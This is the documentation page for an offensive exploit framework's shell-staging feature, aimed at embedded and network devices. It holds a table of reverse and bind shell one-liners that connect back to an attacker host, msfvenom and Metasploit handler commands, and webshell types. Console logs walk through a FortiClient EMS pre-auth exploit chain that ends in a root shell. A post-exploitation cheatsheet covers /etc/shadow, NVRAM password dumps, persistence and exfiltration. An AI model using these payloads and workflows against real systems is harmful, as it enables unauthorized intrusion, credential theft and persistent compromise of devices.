# Shell Stager and Post-Exploitation

**Language:** English (en-US) | **pt-BR:** [../pt-BR/13-shell-stager.md](../pt-BR/13-shell-stager.md)

---

## Overview

EmbedXPL-Forge includes a built-in **Shell Stager** framework that integrates into weaponized exploit modules. It provides:

- 26 shell types (reverse, bind, Meterpreter, webshells)
- A PTY-aware built-in listener (raw mode, SIGWINCH resize, auto PTY upgrade)
- Meterpreter RC file generation
- `ShellStagingMixin` for any exploit class
- `force_exploit` (skip check) and `ask_on_fail` (prompt on check failure)
- Automatic GTFOBins post-exploitation cheatsheet after shell closes

---

## Shell Stager options

All weaponized exploit modules that include `ShellStagingMixin` expose these options:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `lhost` | `OptString` | `""` | Attacker IP for reverse shells / Meterpreter handler |
| `lport` | `OptPort` | `4444` | Listener TCP port |
| `shell_type` | `OptString` | `auto` | Shell type (see full list below) |
| `force_exploit` | `OptBool` | `false` | Skip `check()` and go straight to exploit |
| `ask_on_fail` | `OptBool` | `true` | Prompt user if `check()` returns False/None |
| `pty_upgrade` | `OptBool` | `true` | Auto-send `python3 pty.spawn()` on shell connect |
| `listener_timeout` | `OptPort` | `60` | Seconds to wait for incoming reverse shell |

---

## Supported shell types

### Linux / Unix reverse shells

| `shell_type` | Description | Payload |
|---|---|---|
| `auto` | Tries bash → python → nc_mkfifo → perl | Auto-selected |
| `bash` | Bash TCP redirect | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` |
| `bash_udp` | Bash UDP redirect | `bash -i >& /dev/udp/LHOST/LPORT 0>&1` |
| `nc` | Netcat with `-e` | `nc -e /bin/sh LHOST LPORT` |
| `nc_mkfifo` | Netcat mkfifo (no `-e` needed) | `rm /tmp/.f; mkfifo /tmp/.f; cat /tmp/.f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/.f` |
| `ncat` | Ncat with `-e` | `ncat LHOST LPORT -e /bin/bash` |
| `socat` | Full PTY via socat | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT` |
| `python` | Python 3 socket | `python3 -c "import socket,subprocess,os;..."` |
| `python2` | Python 2 socket | `python -c "import socket,subprocess,os;..."` |
| `perl` | Perl socket | `perl -e 'use Socket;...'` |
| `ruby` | Ruby TCPSocket | `ruby -rsocket -e 'f=TCPSocket.open(...)'` |
| `php` | PHP fsockopen | `php -r '$sock=fsockopen(...)'` |
| `awk` | AWK inet | `awk 'BEGIN {s="/inet/tcp/0/LHOST/LPORT";...}'` |
| `java` | Java Runtime.exec | `r=Runtime.getRuntime();p=r.exec(["/bin/bash",...])` |

### Windows shells

| `shell_type` | Description |
|---|---|
| `powershell` | PowerShell TCP reverse shell (full interactive) |
| `powershell_b64` | Base64-encoded PowerShell (bypass ExecutionPolicy) |
| `cmd_nc` | `cmd.exe /c nc.exe LHOST LPORT -e cmd.exe` |

### Bind shells

| `shell_type` | Description |
|---|---|
| `nc_bind` | `nc -lvp LPORT -e /bin/sh` |
| `python_bind` | Python 3 bind shell |

### Meterpreter (MSF)

| `shell_type` | MSF Payload | Format |
|---|---|---|
| `meterpreter_linux` | `linux/x86/meterpreter/reverse_tcp` | ELF |
| `meterpreter_linux_x64` | `linux/x64/meterpreter/reverse_tcp` | ELF |
| `meterpreter_windows` | `windows/meterpreter/reverse_tcp` | EXE |
| `meterpreter_windows_x64` | `windows/x64/meterpreter/reverse_tcp` | EXE |
| `meterpreter_php` | `php/meterpreter/reverse_tcp` | PHP |
| `meterpreter_python` | `python/meterpreter/reverse_tcp` | PY |

For Meterpreter types, the module prints:
1. The `msfvenom` command to generate the stager binary
2. Metasploit handler setup commands
3. Writes an RC file to `.tmp/msf_handler_<port>.rc`

### Webshells (output content for upload)

| `shell_type` | Language | Access |
|---|---|---|
| `php_webshell` | PHP | `?cmd=whoami` |
| `aspx_webshell` | ASP.NET | `?cmd=whoami` |
| `jsp_webshell` | Java JSP | `?cmd=whoami` |

---

## PTY-aware listener

When `lhost` is set and a reverse shell type is selected, EmbedXPL-Forge starts a built-in Python TCP listener that:

1. Binds `0.0.0.0:LPORT`
2. Waits for the reverse connection
3. Sets the local terminal to **raw mode** (`tty.setraw`)
4. Uses `select()` for bidirectional I/O multiplexing
5. Handles `SIGWINCH` (terminal resize) — sends `stty rows N cols M` to the remote shell
6. Sends `python3 pty.spawn('/bin/bash')` immediately after connection (if `pty_upgrade=true`)
7. Supports **`Ctrl+]`** (ASCII 29) to detach without killing the session
8. Restores terminal on exit via `termios.tcsetattr`

```text
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 192.168.1.100:52341 -- entering PTY interaction
[shell] PTY shell active. Ctrl+] to detach, Ctrl+D to close.

$ id
uid=0(root) gid=0(root) groups=0(root)
$ python3 -c 'import pty; pty.spawn("/bin/bash")'   # already sent automatically
root@router:~#
```

---

## `force_exploit` and `ask_on_fail`

These options control behavior when `check()` returns a negative result:

```text
exf (globalprotect_auth_bypass_cve_2026_0257) > set force_exploit true
[+] force_exploit => true
exf (globalprotect_auth_bypass_cve_2026_0257) > run
[!] force_exploit=true -- skipping check, proceeding directly
[*] Stage 2 - Forging X.509 certificates...
```

```text
# Default: ask_on_fail=true
exf (globalprotect_auth_bypass_cve_2026_0257) > check
[-] check() result: NOT VULNERABLE (patched or unreachable)
[?] Proceed with exploit attempt anyway? [y/N] y
[!] User chose to proceed despite check failure
```

---

## Full workflow example

```text
exf > use exploits/firewalls/fortinet/forticlient_ems_preauth_rce_cve_2026_35616
exf (FortiClient EMS Pre-Auth...) > set target 10.0.0.20
[+] target => 10.0.0.20

exf (FortiClient EMS Pre-Auth...) > set lhost 10.0.0.99
[+] lhost => 10.0.0.99

exf (FortiClient EMS Pre-Auth...) > set lport 4444
[+] lport => 4444

exf (FortiClient EMS Pre-Auth...) > set shell_type bash
[+] shell_type => bash

exf (FortiClient EMS Pre-Auth...) > check
[*] Running check()...
[*] EMS API endpoint responded (HTTP 401) - confirmed
[+] check() result: Target is VULNERABLE -- proceeding with exploit

exf (FortiClient EMS Pre-Auth...) > run
[*] FortiClient EMS at 10.0.0.20:443 -- pre-auth bypass chain
[*] Stage 2 - Forging X.509 certificates with Fortinet DNs...
[+] Cert forged (variant 0): subject='CN=FortiClient EMS, O=Fortinet Ltd., C=US'
[*] Stage 3 - Header injection bypass...
[+] BYPASS CONFIRMED via GET /api/v1/system/info (DN variant 0, PEM: True)!
     token=YES cookie=NO
[*] Stage 4 - Validation via /api/v1/system/info...
[+] EMS SYSTEM INFO: serial=FEMS9000000001 version=7.4.5 host=ems-prod
[*] Stage 5 - EMS fleet enumeration...
[+] Endpoints (12): [{"id":"ep001","hostname":"ws01",...},...]
[+] Admin Accounts (2): [{"username":"admin","role":"super_admin"},...]
[*] Stage 7 - Shell staging via EMS diagnostic API...
[*] Trying: bash
[*] Payload: bash -i >& /dev/tcp/10.0.0.99/4444 0>&1
[shell] Listening on 0.0.0.0:4444 (timeout 60s) -- PTY mode
[shell] Shell connected from 10.0.0.20:49211
[shell] PTY shell active. Ctrl+] to detach.

$ id
uid=0(root) gid=0(root)
$ hostname
ems-prod
^]

[shell] Detaching from shell (session may remain active)
[shell] Terminal restored.

================================================================
  [GTFOBins] Post-Exploitation Cheatsheet -- Embedded Linux / IoT
  Reference: https://gtfobins.github.io
================================================================
  -- Discovery --
  [SUID binaries              ] find / -perm -4000 -ls 2>/dev/null
  [Sudo check                 ] sudo -l
  [Capabilities               ] getcap -r / 2>/dev/null
  ...
  -- Credentials --
  [Embedded creds             ] cat /etc/passwd; cat /etc/shadow
  [Router/ONT config          ] nvram show 2>/dev/null | grep -i pass
  ...
================================================================
```

---

## Meterpreter workflow

```text
exf (fortios_auth_bypass_cve_2022_40684) > set shell_type meterpreter_linux
[+] shell_type => meterpreter_linux

exf (fortios_auth_bypass_cve_2022_40684) > set lhost 10.0.0.99
exf (fortios_auth_bypass_cve_2022_40684) > set lport 4444
exf (fortios_auth_bypass_cve_2022_40684) > run

[meterpreter] Generate stager with:
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.99 LPORT=4444 -f raw -o /tmp/stage.elf

[meterpreter] MSF handler setup:
  use exploit/multi/handler
  set PAYLOAD linux/x86/meterpreter/reverse_tcp
  set LHOST 10.0.0.99
  set LPORT 4444
  exploit -j

[meterpreter] One-liner: msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x86/...; ...'
[meterpreter] RC file written: .tmp/msf_handler_4444.rc
[meterpreter] Run: msfconsole -r .tmp/msf_handler_4444.rc
```

---

## GTFOBins post-exploitation cheatsheet

After every shell session ends, EmbedXPL-Forge automatically prints a reference cheatsheet focused on **embedded Linux / IoT** environments. Key sections:

| Category | Examples |
|----------|---------|
| Discovery | `find / -perm -4000`, `sudo -l`, `getcap -r /`, crontabs, `ps aux` |
| Credentials | `/etc/shadow`, NVRAM, OpenWrt `uci show`, camera `/mnt/mtd/Config/Account1` |
| Privilege Escalation | `python3 os.execl`, `busybox sh`, `awk sudo`, `find` SUID, vi escape |
| Persistence | cron, SSH key inject, SUID bash, init.d |
| Exfiltration | `curl`, `nc`, `base64 \| nc` |
| Restricted Shell Escape | rbash via `env`, `python3`, `vi` |

**GTFOBins reference:** [https://gtfobins.github.io](https://gtfobins.github.io)

**BusyBox-specific:** [https://gtfobins.github.io/gtfobins/busybox/](https://gtfobins.github.io/gtfobins/busybox/)


[Wiki hub](../README.md)
